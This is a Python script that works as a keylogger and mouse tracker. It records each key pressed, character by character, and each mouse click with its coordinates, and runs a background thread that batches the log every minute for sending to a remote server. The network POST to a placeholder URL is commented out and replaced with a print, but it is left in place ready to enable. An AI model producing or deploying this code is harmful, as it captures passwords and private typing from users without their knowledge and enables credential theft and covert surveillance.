import threading
import time
import requests
from pynput import keyboard, mouse

# Global variables
user_activity = []

# Server URL to send the data
server_url = "https://your-server-url.com/activity"

# Define a function to send user activity data to the server
def send_activity_data():
    global user_activity
    while True:
        if user_activity:
            data = {"activity": user_activity}
            print(data)
            # response = requests.post(server_url, json=data)
            # if response.status_code == 200:
            #     print("User activity sent successfully.")
            #     user_activity = []  # Clear the activity log
            # else:
            #     print(f"Failed to send user activity. Status code: {response.status_code}")
            user_activity = []  # Clear the activity log
        time.sleep(60)  # Send data every 1 minute

# Start the thread to send activity data
activity_thread = threading.Thread(target=send_activity_data)
activity_thread.daemon = True
activity_thread.start()

# Define callback functions for keyboard and mouse events
def on_key_press(key):
    try:
        user_activity.append(f"Key pressed: {key.char}")
    except AttributeError:
        user_activity.append(f"Special key pressed: {key}")

def on_click(x, y, button, pressed):
    if pressed:
        user_activity.append(f"Mouse clicked at ({x}, {y}) with button {button}")

# Create listener objects for keyboard and mouse events
keyboard_listener = keyboard.Listener(on_press=on_key_press)
mouse_listener = mouse.Listener(on_click=on_click)

# Start listening to keyboard and mouse events
keyboard_listener.start()
mouse_listener.start()

# Keep the script running
keyboard_listener.join()
mouse_listener.join()
